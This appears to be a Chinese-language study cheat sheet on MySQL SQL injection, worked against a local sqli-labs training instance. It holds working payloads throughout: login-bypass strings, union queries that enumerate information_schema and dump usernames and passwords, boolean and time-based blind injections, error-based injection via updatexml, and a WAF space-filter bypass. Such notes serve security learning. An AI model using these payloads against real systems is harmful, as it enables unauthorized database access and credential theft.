# Mysql

五种注入

- 布尔型盲注：根据返回页面判断条件真假
- 时间型盲注：用页面返回时间是否增加判断是否存在注入
- 基于错误的注入：页面会返回错误信息
- 联合查询注入：可以使用union的情况下
- 堆查询注入：可以同时执行多条语句

同时，也有可能在UA处 Referer处 Cookie处存在注入

# 使其报错

- 英文单引号
- 英文双引号

# 万能密码测试

- ' or 1=1#

# 判断语句

- or 1=1--+
- 'or 1=1--+
- "or 1=1--+
- )or 1=1--+
- ')or 1=1--+
- ") or 1=1--+
- "))or 1=1--+

此处的`--`为注释，+为占位，也可以通过%20(空格的URL编码)来替代，因为地址栏空格不会进入mysql语句，或者可以直接用%23（#）进行注释

# Information_schema

## 三个常用表

### Schemata

SCHEMA_NAME:数据库名

### tables

TABLE_SCHEMA:数据库名

TABLE_NAME:表名

### columns

TABLE_SCHEMA:数据库名

TABLE_NAME:表名

COLUMN_NAME:字段名

## 爆数据库(schemata)

```sql
http://192.168.154.131/sqli/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
```

数据库名.表名：information_schema.schemata

## 爆表名(tables)

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

where 之后的条件用来筛选选中的数据库

table_schema为数据库名

table_name为表名

## 爆字段(columns)

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
```

## 爆数据

由上面的处理已知存在数据表users,users下有username和password两个字段

所以可以构造语句

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(username),group_concat(password) from users--+
```

查询所有结果或者通过id来查询指定的结果

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,username,password from users where id=2--+
```

# 常用函数

group_concat(schema_name)可以查出所有的数据库名

# 盲注

盲注为不会把查询结果返回到前端的注入

## 爆数据库名长度

数据库名security八位，到>=9的时候会错误，此为Bool盲注

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and length(database())>=8 %23
```

确定数据库名长度为八位

## 逐位爆数据库

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr(database(),1,1)='s' %23
```

`substr`函数为截取字符串，从第一个字符开始，只返回一个

此步骤比较繁琐，建议使用工具，比如BurpSuite

或者可以采用ascii码猜解

```sql
and ord(substr(database(),1,1))=115
```

## 逐位爆表名

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e' %23
```

limit为从第0位开始，查询第一位，也就是第一个表名

## 逐位爆列名

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i' %23
```

## 爆数据同理

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr((select username from security.users where id='1' limit 0,1),1,1)='d' %23
```

# 报错注入

```sql
' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

有时可能需要将'去掉'

# 延时盲注

### 时间型盲注 [#](https://wiki.wgpsec.org/knowledge/web/sql-injection.html#时间型盲注)

盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。

可以用`benchmark`，`sleep`等造成延时效果的函数。

如果`benkchmark`和`sleep`关键字被过滤了，可以让两个非常大的数据表做[笛卡尔积 (opens new window)](https://blog.csdn.net/qq_32763643/article/details/79187931)产生大量的计算从而产生时间延迟；例如使用[`heavy query` (opens new window)](https://www.anquanke.com/post/id/104319)进行延时注入

或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。

**1、利用sleep判断数据库名长度**

```sql
' and sleep(5) and 1=1--+    页面返回不正常，延时5秒
' and sleep(5) and 1=2--+    页面返回不正常，不延时

and if(length(database())>1,sleep(5),1)
--if(条件表达式，真，假) --C语言的三目运算符类似
```

**2.取数据库名**

```sql
and if(substr(database(),1,1)='a',sleep(5),1)--+
```

### 时间型盲注的加速方式 [#](https://wiki.wgpsec.org/knowledge/web/sql-injection.html#时间型盲注的加速方式)

**1、Windows平台上的Mysql可以用DNSlog加速注入**

**2、利用二分查找法**

sqlmap盲注默认采用的是二分查找法

> - 利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间
> - 以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数
> - 如果大于，就往中间数122这块查找。反之亦然

# Waf绕过

## 空格过滤

可以使用`/**/`来代替空格

